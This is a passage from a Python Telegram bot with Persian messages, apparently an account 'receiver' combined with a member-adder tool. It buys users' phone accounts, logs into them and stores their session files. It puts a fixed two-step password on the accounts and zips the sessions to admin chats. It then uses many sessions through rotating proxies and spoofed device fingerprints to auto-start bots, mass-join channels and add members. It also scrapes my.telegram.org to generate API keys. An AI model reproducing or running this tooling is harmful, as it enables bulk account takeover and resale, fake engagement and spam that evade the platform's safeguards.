                    '**❌ پسورد اشتباه هست لطفا مجددا پسورد درست رو به فرمت زیر وارد کنید \n  /pass PASSWORD**')
            await new.disconnect()

    except:
        pass
    
    if datauser["typeusers"][0] == "starttexts":
        linkbot = str(event.text).split("?")
        if not linkbot[1]:
            await event.reply("ایدی ربات درست نمیباشد")
        else:
            try:
                await event.reply("تعداد اکانت برای استارت را بفرستید")
                datauser["typeusers"] = ["startbutcoun", str(event.chat_id), "tex", str(linkbot[0]).split("me/")[1], str(linkbot[1]).split("=")[1]]
            except Exception as e:
                print(e)
                await event.reply("ایدی ربات درست نمیباشد")

    elif datauser["typeusers"][0] == "menualstart":
        linkbot = str(event.text).split("?")
        if not linkbot[1]:
            await event.reply("ایدی ربات درست نمیباشد")
        else:
            try:
                await event.reply("""
ایدی های چنل را بصورت زیر بفرستید
@testsad
@testsad
@testsad""")
                datauser["typeusers"] = ["startmenualcoun", str(event.chat_id), "but", str(linkbot[0]).split("me/")[1], str(linkbot[1]).split("=")[1]]
            except Exception as e:
                print(e)
                await event.reply("ایدی ربات درست نمیباشد")

    elif datauser["typeusers"][0] == "buttonstarts":
        linkbot = str(event.text).split("?")
        if not linkbot[1]:
            await event.reply("ایدی ربات درست نمیباشد")
        else:
            try:
                await event.reply("تعداد اکانت برای استارت را بفرستید")
                datauser["typeusers"] = ["startbutcoun", str(event.chat_id), "but", str(linkbot[0]).split("me/")[1], str(linkbot[1]).split("=")[1]]
            except Exception as e:
                print(e)
                await event.reply("ایدی ربات درست نمیباشد")

    elif datauser["typeusers"][0] == "startmenualcoun":
        await event.reply("تعداد اکانت برای استارت را بفرستید")
        datauser["linkchanels"] = str(event.text)
        datauser["typeusers"][0] = ".s.s.s"
        datauser["typeusers2"] = ["startmenual"]
        
    elif datauser["typeusers2"][0] == "startmenual":
        c = 0
        SessionStarted = []
        obj = [fn for fn in os.listdir("Accounts") if any(fn.endswith(ext) for ext in [".session"])]
        if len(obj) >= int(event.text):
            for i in range(int(event.text)):
                if str(obj[i]) not in SessionStarted:
                    links = []
                    device = random.choice(devices)
                    version1 = random.choice(version)
                    apis2 = getapiPhone(str(obj[i]).replace(".session", ""))
                    pr = await random_proxy()    
                    print(pr)          
                    a, b, c = datauser["typeusers"][3], datauser["typeusers"][3], str(datauser["typeusers"][4])
                    clientds = TelegramClient(f'Accounts/{str(obj[i]).replace(".session", "")}', int(apis2[0]), apis2[1], connection=connection.ConnectionTcpMTProxyRandomizedIntermediate, proxy=pr,device_model=device, system_version=version1, app_version="7.84", lang_code='en', system_lang_code='en')
                    await clientds.connect()
                    try:
                        await clientds(StartBotRequest(a,b,c))
                    except:
                        pass
                    time.sleep(1.6)
                    messagesd = str(datauser["linkchanels"]).split("\n")
                    for ii in messagesd:
                        try:
                            try:
                                await clientds(ImportChatInviteRequest(str(ii)))    
                            except:
                                await clientds(JoinChannelRequest(str(ii)))
                            time.sleep(2)
                        except:
                            await event.reply("ارور در جوین لطفا روش دستی را انتخاب کنید")
                            datauser.clear()
                            await clientds.disconnect()
                            c = 0
                            break
                    await clientds.send_message(a, "/start")
                    time.sleep(1.6)
                    await clientds.disconnect()
                    SessionStarted.append(str(obj[i]))
            await event.reply("تمام شد")
            datauser.clear()
        else:
            await event.reply("اکانت به اندازه کافی موحود نیست")
            datauser.clear()

    elif datauser["typeusers"][0] == "startbutcoun":
        c = 0
        SessionStarted = []
        obj = [fn for fn in os.listdir("Accounts") if any(fn.endswith(ext) for ext in [".session"])]
        if len(obj) >= int(event.text):
            for i in range(int(event.text)):
                if str(obj[i]) not in SessionStarted:
                    device = random.choice(devices)
                    version1 = random.choice(version)
                    apis2 = getapiPhone(str(obj[0]).replace(".session", ""))
                    pr = await random_proxy()    
                    print(pr)          
                    client = TelegramClient(f'Accounts/{str(obj[0]).replace(".session", "")}', int(apis2[0]), apis2[1], connection=connection.ConnectionTcpMTProxyRandomizedIntermediate, proxy=pr,device_model=device, system_version=version1, app_version="7.84", lang_code='en', system_lang_code='en')
                    await client.connect()
                    if str(datauser["typeusers"][2]) == "but":
                        links = []
                        await client(StartBotRequest(datauser["typeusers"][3], datauser["typeusers"][3], str(datauser["typeusers"][4])))
                        time.sleep(1.3)
                        messagesd = (await client.get_messages(datauser["typeusers"][3], limit=1))[0]
                        try:
                            for ii in messagesd.buttons:
                                if str(ii[0].url) != "None" and str(ii[0].url) not in links:
                                    try:
                                        try:
                                            await client(ImportChatInviteRequest(str(ii[0].url)))    
                                        except:
                                            await client(JoinChannelRequest(str(ii[0].url)))
                                    except:
                                        await event.reply("ارور در جوین لطفا روش دستی را انتخاب کنید")
                                        datauser.clear()
                                        await client.disconnect()
                                        break
                            await client.send_message(datauser["typeusers"][3], "/start")
                            await client.disconnect()
                        except:
                            await event.reply("ارور در جوین لطفا روش دستی را انتخاب کنید")
                            datauser.clear()
                            await client.disconnect()
                            break
                    elif str(datauser["typeusers"][2]) == "tex":
                        links = []
                        await client(StartBotRequest(datauser["typeusers"][3], datauser["typeusers"][3], str(datauser["typeusers"][4])))
                        time.sleep(1.3)
                        messagesd = (await client.get_messages(datauser["typeusers"][3], limit=1))[0]
                        findpriv = re.findall("(?P<url>https?://[^\s]+)", messagesd.text)
                        findpub = re.findall(r"(@\S+)", messagesd.text)
                        links.extend(findpriv)
                        links.extend(findpub)
                        try:
                            for ii in links:
                                try:
                                    try:
                                        await client(ImportChatInviteRequest(str(ii)))    
                                    except:
                                        await client(JoinChannelRequest(str(ii)))
                                except:
                                    await event.reply("ارور در جوین لطفا روش دستی را انتخاب کنید")
                                    datauser.clear()
                                    await client.disconnect()
                                    break
                            await client.send_message(datauser["typeusers"][3], "/start")
                            await client.disconnect()
                        except:
                            await event.reply("ارور در جوین لطفا روش دستی را انتخاب کنید")
                            datauser.clear()
                            await client.disconnect()
                            break
                    SessionStarted.append(str(obj[i]))
            await event.reply("تمام شد")
            datauser.clear()
        else:
            await event.reply("اکانت به اندازه کافی موحود نیست")
            datauser.clear()

    elif datauser["typeusers"][0] == "adsu":
        txt = event.text
        NStEVJzsyY.append(txt)
        await event.reply("👽  {} Is Admin Now ! ".format(txt),
                            buttons=[[Button.inline("❌ remove ", 'admin|{}'.format(txt))]])

        try:
            await bot.send_message(txt, '''🏆 مجوز شما توسط مالک فعال شد ! 
➖➖➖➖➖➖ 
به MG Adder نسخه 5 ProMax خوش آمدید''')

        except Exception as e:
            await event.reply("⚠️ {} ".format(str(e)))
        datauser.clear()

    elif datauser["typeusers"][0] == "lunche":
        threading.Thread(target=Lunches, args=(str(event.text),)).start()
        await event.reply("لانچ اجرا شد")
        datauser.clear()

    elif datauser["typeusers"][0] == "delsu":
        txt = event.text
        NStEVJzsyY.remove(txt)
        await event.reply("⚠️ کاربر : {}  با موفقیت از لیست ادمین خارج شد".format(txt))
        datauser.clear()

    elif datauser["typeusers"][0] == "get":
        print("w")
        link = event.text
        await event.reply('''
        🎗لطفا روش استخراج را انتخاب کنید 👇


        ''', buttons=[
            [Button.inline('🆔 یوزرنیم', '@add|addUsername|{}'.format(link)),
                Button.inline('🔼ایدی عددی', '@add|addChatid|{}'.format(link))],
        ])
        datauser.clear()

    elif datauser["typeusers"][0] == "add":
        datauser["dataadd"] = [str(event.text)]
        await event.reply("با چند شماره اد بزنم ؟")
        datauser["typeusers"] = ["fff", str(event.chat_id), str(event.text)]

    elif datauser["typeusers"][0] == "fff":
        fs = list(datauser["dataadd"])
        fs.append(str(event.text))
        datauser["dataadd"] = fs
        await event.reply("چند تا اد بزنم ؟")
        datauser["typeusers"] = ["ddd",  int(event.text)]
    
    elif datauser["typeusers"][0] == "ddd":
        fs = list(datauser["dataadd"])
        fs.append(str(event.text))
        try:
            link = fs[0]
            num = fs[1]
            total = fs[2]
            await event.reply("فرایند اد براساس یوزرهای استخراج شده انتخاب شود👇", buttons=[
                [Button.inline('ایدی عددی', 'addID|{}|{}|{}'.format(link, num, total)),
                    Button.inline('یوزرنیم', 'addUSERNAME|{}|{}|{}'.format(link, num, total))]])
        except:
            await event.reply("error")
        datauser.clear()


    try:
        if datauser["typeusers"][0] == "filestyp":
            if event.message.media:
                if ".zip" in str(event.message.file.name):
                    file = await event.message.download_media("ZipFiles")
                    shutil.unpack_archive(file, "Accounts")
                    os.remove(file)
                    datauser.clear()
    except:
        pass


###########################################################
###########################################################
###########################################################
###########################################################
###########################################################
###########################################################





def minify(file_name):
    file_data = open(file_name, "r", 1).read()  # store file info in variable
    json_data = json.loads(file_data)  # store in json structure
    json_string = json.dumps(json_data, separators=(
        ',', ":"))  # Compact JSON structure
    # remove .json from end of file_name string
    file_name = str(file_name).replace(".json", "")
    new_file_name = "{0}.json".format(file_name)
    # open and write json_string to file
    open(new_file_name, "w+", 1).write(json_string)


def getRandomLineRead(myFile):
    x = list(open(myFile))
    val = (random.choice(x))
    return val


def getSpecificCode(phone):
    try:
        with open(f'Apires/{phone}.txt', 'r') as myfile:
            content = myfile.read()
            return [content.split(':')[0], content.split(':')[1]]
    except FileNotFoundError:
        return 0


def validate(id):
    for ids in sudolist:
        if int(ids) == int(id):
            return True

    return False


def create_apis(phone):

    body = f'phone={phone}'
    try:
        response = requests.post('https://my.telegram.org/auth/send_password', data=body, headers={"Origin": "https://my.telegram.org", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
                                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "application/json, text/javascript, */*; q=0.01", "Reffer": "https://my.telegram.org/auth", "X-Requested-With": "XMLHttpRequest", "Connection": "keep-alive", "Dnt": "1", })
        s = json.loads(response.content)
        return s['random_hash']
    except Exception as e:
        print(str(e))
        return False

# -------------------


def auths(phone, hash_code, pwd):
    data = f"phone={phone}&random_hash={hash_code}&password={pwd}"
    telVal = 'https://my.telegram.org/auth/login'
    responses = requests.post(telVal, data=data)
    try:
        return responses.cookies['stel_token']
    except:
        return False


def auth2s(stel_token):

    name = ["keivan", "reza", "hamid", "mamd", "aref", "sajad", "asghar"]
    name = random.choice(name)

    resp = requests.get('https://my.telegram.org/apps',
                        headers={"Cookie": "stel_token={0}".format(stel_token)})

    tree = html.fromstring(resp.content)
    api = tree.xpath(
        '//span[@class="form-control input-xlarge uneditable-input"]//text()')
    try:
        return '{0}:{1}'.format(api[0], api[1])
    except:
        s = resp.text.split('"/>')[0]
        value = s.split('<input type="hidden" name="hash" value="')[1]
        on = "hash={0}&app_title=Coded By Keyvan&app_shortname={1}&app_url=&app_platform=desktop&app_desc=".format(
            value, name)
        requests.post('https://my.telegram.org/apps/create', data=on, headers={"Cookie": "stel_token={0}".format(stel_token), "Origin": "https://my.telegram.org", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4",
                      "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "*/*", "Referer": "https://my.telegram.org/apps", "X-Requested-With": "XMLHttpRequest", "Connection": "keep-alive", "Dnt": "1", })
        respv = requests.get('https://my.telegram.org/apps', headers={"Dnt": "1", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4", "Upgrade-Insecure-Requests": "1",
                             "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36", "Reffer": "https://my.telegram.org/org", "Cookie": "stel_token={0}".format(stel_token), "Cache-Control": "max-age=0", })
        trees = html.fromstring(respv.content)
        apis = trees.xpath(
            '//span[@class="form-control input-xlarge uneditable-input"]//text()')
        return '{0}:{1}'.format(apis[0], apis[1])


async def list_splitter(my_list, n):

    final = [my_list[i * n:(i + 1) * n] for i in range((len(my_list) + n - 1))]
    return final


def list_splitter2(my_list, n):

    final = [my_list[i * n:(i + 1) * n] for i in range((len(my_list) + n - 1))]
    return final
# ----------------------








@bot.on(events.NewMessage(pattern='/getsessions'))
async def my_event_handler(event):
    if event.message.text == "/getsessions1":
        if event.sender_id in sudolist:
            await event.respond("در حال ارسال سشن های سالم")
            zip = ZipFile('all.zip', 'a')
            if event.sender_id in sudolist:
                for item in os.scandir("salem"):
                    zip.write("salem"+'/'+item.name)
                zip.close()
                await bot.send_file(event.chat_id, 'all.zip')
                os.remove('all.zip')
            else:
                await event.respond('admin err!')
                
    elif event.message.text == "/getsessions2":
        if event.sender_id in sudolist:
            await event.respond("در حال  ارسال سشن های ریپورت")
            zip = ZipFile('all.zip', 'a')
            if event.sender_id in sudolist:
                for item in os.scandir("repacc"):
                    zip.write("repacc"+'/'+item.name)
                zip.close()
                await bot.send_file(event.chat_id, 'all.zip')
                os.remove('all.zip')
            else:
                await event.respond('admin err!')



@bot.on(events.NewMessage(pattern='/getamar'))
async def my_event_handler(event):
    if event.sender_id in sudolist:
        await event.respond("در حال ارسال ...")
        ok = []
        rep = []
        all = []
        for item in os.scandir("repacc"):
            if ".journal" not in item.name:
                rep.append(item.name)
        for item in os.scandir("salem"):
            if ".journal" not in item.name:
                ok.append(item.name)
        for item in os.scandir("Accountsres"):
            if ".journal" not in item.name:
                all.append(item.name)
        await event.respond(f"""
سالم : {len(ok)}

ریپورت : {len(rep)}

کل : {len(all)}
                            """)



dname = 'salem'
bname = 'backup'


@bot.on(events.NewMessage(pattern='/on_send_bot'))
async def my_event_handler(event):
    await event.respond('ok')
    if event.sender_id in sudolist:
        while True:
            await asyncio.sleep(5)
            try:
                print(1)
                lis = []
                for item in os.scandir(dname):
                    lis.append(item.name)
                if len(lis) >= num:
                    zip = ZipFile('sample.zip', 'a')
                    for i in range(num):
                        x = random.choice(lis)
                        shutil.copy(dname+'/'+x, bname)
                        zip.write(dname+'/'+x)
                        lis.remove(x)
                        os.remove(dname+'/'+x)
                    zip.close()
                    await bot.send_file(cfail, 'sample.zip')
                    os.remove('sample.zip')
                else:
                    pass
                lis.clear()
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(e)
    else:
        await event.respond('admin err!')


@bot.on(events.NewMessage(pattern='/num'))
async def my_event_handler(event):
    lis = []
    if event.sender_id in sudolist:
        for item in os.scandir(dname):
            lis.append(item.name)
        w = len(lis)
        await event.respond(f'تعداد فایل در پوشه:{w}')
    else:
        await event.respond('admin err!')


@bot.on(events.NewMessage(pattern='/z_bot'))
async def my_event_handler(event):
    zip = ZipFile('all.zip', 'a')
    if event.sender_id in sudolist:
        for item in os.scandir(dname):
            shutil.copy(dname+'/'+item.name, bname)
            zip.write(dname+'/'+item.name)
            os.remove(dname+'/'+item.name)

        zip.close()
        await bot.send_file(event.chat_id, 'all.zip')
        os.remove('all.zip')
    else:
        await event.respond('admin err!')


@bot.on(events.NewMessage())
async def my_event_handler(event):

    userids = event.sender_id
    text = event.raw_text
    global info

    if event.raw_text == "sessions":
        try:
            shutil.make_archive("Accountsres", 'zip', "Accountsres")

            await bot.send_file(int(event.sender_id), 'Accountsres.zip')
            await asyncio.sleep(0.2)

            await bot.send_message(int(userids), "All Sessions Sent **Successfully** !")

            os.remove("Accountsres.zip")
        except Exception as e:
            await event.reply(str(e))

    if text.startswith("/admin"):
        ids = event.raw_text.split("/admin")[1]
        ids = ids.strip()
        admins.sadd("admin", ids)

        await event.reply(f'''
➖➖➖➖➖➖➖
✅ {ids} Added To Admin List 
➖➖➖➖➖➖➖
❕Use **/ban {ids}** For Ban USer
➖➖➖➖➖➖➖
            ''')

    if text.startswith("/ban"):
        ids = event.raw_text.split("/ban")[1]
        ids = ids.strip()

        admins.srem("admin", ids)

        await event.reply(f'''
➖➖➖➖➖➖➖
✅ {ids} Banned From Admin List 
➖➖➖➖➖➖➖
❕Use **/admin {ids}** For Admin USers
➖➖➖➖➖➖➖
            ''')

    if text.startswith("/getphone"):
        ev = []
        try:
            for item in os.scandir('Accountsres'):
                if 'journal' not in item.name and '.session' in item.name:
                    ev.append(item.name)

            logs = ""
            print(list_splitter2(ev, 20))
            for i in list_splitter2(ev, 20):
                if len(i) != 0:
                    for j in i:
                        logs += j + "\n"

                    await event.reply(logs)
                    logs = ""

        except Exception as e:
            await event.reply(str(e))

    if validate(userids):

        if event.raw_text.startswith("/reset"):
            if ((event.raw_text.split("/reset")[1]) != ""):
                usr = (event.raw_text.split("/reset")[1]).strip()
                if user.get(f"sacc:{usr}"):
                    user.set(f"sacc:{usr}", 0)

                    await event.reply(f"✅ آمار کاربر با مشخصات : {usr} با موفقیت ریست شد❕")

                else:
                    await event.reply("❌کاربری با این مشخصات یافت نشد")

            else:
                mlist = user.keys(f"sacc:*")

                for item in mlist:
                    user.set(item, 0)

                user.set("accs", 0)
                await event.reply("✅ کلیه امار ربات ریست شد ")

        if text.startswith("help") or text.startswith("/help"):
            await event.reply('''
    👽 help 

    ▫️نمایش راهنما و مستندات ربات 

    ▬▭▬▭▬▭▬▭▬▭▬▭

    👽 ping 

    ▪️نمایش وضعیت ربات 

    ▬▭▬▭▬▭▬▭▬▭▬▭

    👽 /send [ID] [TEXT]

    ▫️ارسال پیام به کاربر خاص ( با چت ایدی )

    ▬▭▬▭▬▭▬▭▬▭▬▭

    👽   /forward 

    ▪️فور وارد همگانی 

    ▬▭▬▭▬▭▬▭▬▭▬▭

    👽  /setpass  [PASSWORD]

    ▪️ تنظیم پسورد خاص روی اکانت ها.
    ⚠️در حالت پیشفرض پسورد تمامی اکانت ها Naji است.

    ▬▭▬▭▬▭▬▭▬▭▬▭

    👽 on | off   

    ▫️ روشن خاموش کردن ربات 

    ▬▭▬▭▬▭▬▭▬▭▬▭

    👽 /amar [ID] 

    ▪️ گرفتن آمار اکانت های اهدا شده از کاربر خاص

    ▬▭▬▭▬▭▬▭▬▭▬▭

    👽 /getamar 

    ▫️گرفتن آمار کل 
▬▭▬▭▬▭▬▭▬▭▬▭

/getsessions0
گرفتن کل فایل ها 

/getsessions1

گرفتن پوشه سالم ها

/getsessions2

گرفتن پوشه ریپورت ها

▬▭▬▭▬▭▬▭▬▭▬▭

/reset id

ریست کردن کاربرخاص

/reset

ریست کل امار

▬▭▬▭▬▭▬▭▬▭▬▭

resiver @ImTanun

                ''')

        if text.startswith("/getsessions0"):

            try:
                shutil.make_archive("Accountsres", 'zip', "Accountsres")
                await bot.send_file(event.chat_id, 'Accountsres.zip')

                await bot.send_message(event.chat_id, "✅ سشن های ربات ارسال گردید")

                os.remove("Accountsres.zip")

            except Exception as e:
                await event.reply(str(e))

        if text.startswith("/setpass"):
            try:

                passCode = event.raw_text.split("/setpass")[1]
                passCode = passCode.strip()
                user.set("pass", passCode)
                await event.reply("✅تنظیم دو مرحله ای بر روی اکانت شما تنظیم شد ")

            except:
                await event.reply("‼️ لطفا دستور وارد شده را به دقت و به درستی وارد کنید ")

        elif event.raw_text.lower() == 'accounts':

            ev = []
            tl = 0
            for item in os.scandir('Accountsres'):
                if 'journal' not in item.name and '.session' in item.name:
                    l = [
                        [Button.inline(item.name, 'settings|{}'.format(item.name))]]
                    ev.extend(l)
                    tl += 1

            ev.extend([[Button.inline("▫️انتقال اکانت", "enteghal")]])
            print("ok")
            if tl >= 1:
                try:
                    await event.reply('شما  **{}**  اکانت دارید  '.format(tl), buttons=ev)

                except errors.rpcerrorlist.ReplyMarkupTooLongError:
                    async for i in await list_splitter(ev, 50):
                        await event.reply('شما  **{}**  اکانت دارید  '.format(tl), buttons=ev)

            else:
                await event.reply('دیتابیس خالی است !')

        if text.startswith("on"):
            user.set("on", 1)
            await event.reply("✅ ربات در حال حاظر روشن است ")

        elif text.startswith("off"):
            user.set("on", 0)
            await event.reply('''🔌 ربات خاموش شد 
    ➖➖➖➖➖➖ 
    برای روشن کردن ان از دستور »

    on 

    استفاده کنید''')

        elif text.startswith("/forward"):

            await event.reply('''⚠️ بنر خود را برای فور وارد همگانی ارسال کنید ❕''')
            user.set(f"step:{userids}", "fwd")

        elif user.get(f"step:{userids}") == "fwd":

            await event.reply('''✅✅ بنر با موفقیت تنظیم شد 
    ▬▭▬▭▬▭▬▭▬▭▬▭
    در حال ارسال به کاربران لطفا منتظر بمانید !''')

            scount = 0
            fcount = 0
            for item in account.smembers("user"):

                try:
                    await bot.forward_messages(int(item), event.message)
                    await asyncio.sleep(0.2)
                    scount += 1

                except Exception as e:
                    print(str(e))
                    fcount += 1

            await event.reply(f'''✅ عملیات فور وارد همگانی با موفقیت به اتمام رسید 
    ➖➖➖➖➖➖
    👽 موفقیت آمیر : {scount}

    🥵 غیر موفقیت آمیز : {fcount}
    ➖➖➖➖➖➖''')
            user.set(f"step:{userids}", "None")

        elif text.startswith("/send"):
            try:
                datas = event.raw_text.split("/send")[1]
                datas = datas.strip()
                datas = datas.split(None, 1)
                id = int(datas[0].strip())
                txt = datas[1]
                try:
                    await bot.send_message(id, txt)
                    await event.reply("✅ پیام شما با موفقیت ارسال شد ")
                except Exception as e:
                    await event.reply("Error : " + str(e))
            except Exception as e:
                print(str(e))
                await event.reply('''⚠️ فرمت صحیح دستور را وارد کنید :

    ➖➖➖➖➖➖ 

    /send id text

    ➖➖➖➖➖➖
    مثال : 
    /send 28219976 سلام و خسته نباشید''')

        elif text.startswith("/amar"):

            if ((event.raw_text.split("/amar"))[1].strip()).isdigit():
                usr = (event.raw_text.split("/amar")[1]).strip()
                print(usr)
                sacc = user.get(f"sacc:{usr}")

                txt = f'''✅ تعداد اکانت اهدا شده : {sacc}

    ➖➖➖➖➖➖ 

'''

                await event.reply(txt)

            else:

                acc = user.get(f"accs")
                if acc == None:
                    acc = 0

                txt = f'''✅ تعداد کل اکانت ها اهدا شده : {acc}

    ➖➖➖➖➖➖ 
'''

                await event.reply(txt)

        # -------------------------

    if user.get("on") == "1":

        if event.raw_text.lower() == "رسیور":

            if validate(userids):

                await event.reply('''😀به ربات خریدشماره اروپا خوش امدید🌹

💰قیمت هراکانت4000تومن میباشد

▪️لطفا و حتما قبل ازشروع کار با ادمین هماهنگ کنید👇
 @ImTanun

📞روی دکمه ارسال شماره کلیک کنید👇''', buttons=[[Button.text("ارسال شماره 📞", resize=True)], [Button.text("❕پشتیبانی", resize=True), Button.text("❔اطلاعات من", resize=True)], [Button.text("✅تسویه حساب", resize=True)], [Button.text("🌈دریافت کد", resize=True)]])

                user.set(f"step:{userids}", "None")

            else:
                user.set(f"step:{userids}", 'None')
                account.sadd("user", userids)
                if user.get(f"sacc:{userids}") == None:
                    user.set(f"sacc:{userids}", 0)
                if user.get(f"facc:{userids}") == None:
                    user.set(f"facc:{userids}", 0)
                if user.get(f"nacc:{userids}") == None:
                    user.set(f"nacc:{userids}", 0)
                await event.reply('''😀به ربات خریدشماره امریکاخوش امدید🌹

💰قیمت هراکانت4000تومن میباشد

▪️لطفا و حتما قبل ازشروع کار با ادمین هماهنگ کنید👇
 @ImTanun

📞روی دکمه ارسال شماره کلیک کنید👇''', buttons=[[Button.text("ارسال شماره 📞", resize=True)], [Button.text("❕پشتیبانی", resize=True), Button.text("❔اطلاعات من", resize=True)], [Button.text("✅تسویه حساب", resize=True)]])

        elif event.raw_text == "❕پشتیبانی":
            await event.reply('''👽 متن خود را خلاصه بنویسید، پس از ارسال پیام یکی اد ادمین های ما با شما تماس خواهد گرفت''', buttons=[[Button.inline("cancel", "cancel")]])

            user.set(f"step:{userids}", "contact")

        elif event.raw_text == "✅تسویه حساب":

            if user.get(f"allow:{userids}") == "true" or user.get(f"allow:{userids}") == None:

                if int(user.get(f"sacc:{userids}")) < 10:
                    await event.reply("❌خطا ! برای درخاست تصویه حداقل 10 اکانت اهدا کنید ❌")
                    return

                await event.reply('''
    ✅ کاربر عزیز لطفا شماره کارت و یا شماره شبا خود را وارد کنید ❕
    ➖➖➖➖➖➖➖➖➖
                    ''')

                user.set(f"step:{userids}", "cartnum")

            else:

                await event.reply('''
❌ شما قبلا یک سفارش ثبت شده دارد 
➖➖➖➖➖➖➖
لطفا تا پایان مشخص شدن وضعیت سفارش منتظر بمایند 
➖➖➖➖➖➖➖
دروصرت تمایل به بازگشت به منوی اصلی از کلید  \n
رسیور 
استفاده کنید .
                    ''')

        elif event.raw_text.isdigit() and user.get(f"step:{userids}") == "cartnum":
            await event.reply('''
✅ سفارش شما با موفقیت صبت شد 
➖➖➖➖➖➖➖
لطفا تا پایان مشخص شدن وضعیت سفارش منتظر بمایند 
➖➖➖➖➖➖➖
دروصرت تمایل به بازگشت به منوی اصلی از کلید  \n
رسیور 
استفاده کنید .
                ''')

            user.set(f"allow:{userids}", "false")

            pol = user.get(f"sacc:{userids}")
            cart = event.raw_text

            txt = f'''
✅کاربر با مشخصات :

❕ID : {userids}
➖➖➖➖
‼️ تعداد شماره های اهدا شده : {pol}
➖➖➖➖
✅شماره کارت  : {cart}
➖➖➖➖
لطفا در صورت واریز شدن به حساب دکمه "✅" و در صورت عدم واریزی و یا مشکل کلید "❌" را انتخاب کنید

            '''
            await bot.send_message(adminssss, txt, buttons=[[Button.inline("✅", f"+:{userids}"), Button.inline("❌", f"-:{userids}")]])

        elif event.raw_text == "تسویه حساب 💰":
            await event.reply("⚠️ بزودی این بخش اضافه میگردد.")

        elif event.raw_text == "❔اطلاعات من":
            usr = event.sender_id
            sacc = user.get(f"sacc:{usr}")
            if sacc == None:
                sacc = 0
            txt = f'''
‼️ کاربر عزیز تعداد اکانت های اهدا شده از جانب شما : {sacc} عدد میباشد .
            '''
            await event.reply(txt)

        elif event.raw_text == "ارسال شماره 📞":
            await event.reply("✅شماره خود را با پیش شماره ( + ) ارسال کنید : \n ✅قیمت هر اکانت 4000")
            user.set(f"step:{userids}", "getPhone")

        elif event.raw_text == "ping" or event.raw_text == "Ping":
            await event.reply("✅ Online")

        elif event.raw_text and user.get(f"step:{userids}") == "contact":
            txt = event.raw_text
            txt += f"\n ➖➖➖➖➖➖ \n ❓ID : {userids} "
            try:

                await bot.send_message(adminssss, txt)
                await event.reply('''👽 کاربر عزیز پیام شما با موفقیت به یکی از ادمین های ربات ارسال شد و در اسرع وقت پاسخ شما دوست عزیز داده خواهد شد.

⚠️ پیشاپیش از صبر شما متشکریم❤️''')

            except Exception as e:
                print(str(e))
                await event.reply("we have Some Problem ! Try Again Later !")
            user.set(f"step:{userids}", "None")

        elif event.raw_text.startswith("+") and user.get(f"step:{userids}") == "getPhone":
            print("getPhone")
            phones = event.raw_text
            phones = (phones.split("+")[1].replace(" ", ""))

            if not phones.isdigit():
                await event.reply("❌ شماره وارد شده اشتباه است")

                return

            phones = "+" + phones
            print(phones)
            # m = await event.reply("▪️ لطفا کمی صبر کنید ...")
            if os.path.exists('Accountsres/{0}/'.format(phones)):
                await event.reply('**❌ این اکانت قبلا در دیتابیس ربات ثبت شده❗️**')
            else:

                try:

                    w = getapiPhone(phones)
                    print(w)
                    device = random.choice(devices)
                    version1 = random.choice(version)
                    appv = random.choice(appvs)
                    pr = await random_proxy()
                    print(pr)
                    new = TelegramClient('Accountsres/{0}'.format(phones), w[0], w[1],
                                        device_model=device,
                                        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                        proxy=tuple(pr),
                                        system_version=version1,
                                        app_version=appv)

                    await new.connect()
                    # if not await new.is_user_authorized():
                    try:
                        result = await new.send_code_request(phones)
                        user.set(f'code_mode:{userids}',  '{0}:{1}:{2}:{3}'.format(
                            phones, result.phone_code_hash, w[0], w[1]))
                        await new.disconnect()
                        await event.reply(f'''▫️ کاربر عزیز، کد ارسال شده به شماره  {phones} را با دقت وارد کرده  \n ➖➖➖➖➖➖\n''')

                        user.set(f"step:{userids}", "getCode")

                    except Exception as e:
                        print(str(e))
                        await event.reply('**❌ Error In Send Code Please Try Again Later...**')
                        try:
                            await new.disconnect()
                            os.remove('Accountsres/{}.session'.format(phones))
                        except:
                            pass
                except KeyError:
                    await event.reply('**🔰 No Any Account In Queue \n use رسیور **')
                    user.set(f"step:{userids}", 'None')

        elif event.raw_text == "بازگشت به منوی اصلی":
            user.delete(f"step:{userids}")
            await event.reply('''
▫️به منوی اصلی بازگشتید.

✅ لطفا گزینه مناسب رو انتخاب کنید 
                ''', buttons=[[Button.text("ارسال شماره 📞", resize=True)], [Button.text("❕پشتیبانی", resize=True), Button.text("❔اطلاعات من", resize=True)]])

        elif event.raw_text.isdigit() and user.get(f"step:{userids}") == "getCode":
            try:
                key = user.get(f'code_mode:{userids}')
                w = getapiPhone(key.split(':')[0])
                await event.reply('**🔰 ▪️ لطفا کمی صبر کنید .... **')
                device = random.choice(devices)
                version1 = random.choice(version)
                appv = random.choice(appvs)
                pr = await random_proxy()
                print(pr)
                new = TelegramClient('Accountsres/{0}'.format(key.split(':')[0]), w[0], w[1],
                                    device_model=device,
                                    connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
                                    proxy=tuple(pr),
                                    system_version=version1,
                                    app_version=appv)

                await new.connect()

                await new(functions.auth.SignInRequest(phone_number=key.split(':')[0], phone_code_hash=key.split(':')[1], phone_code=event.raw_text))
                info = await new.get_me()

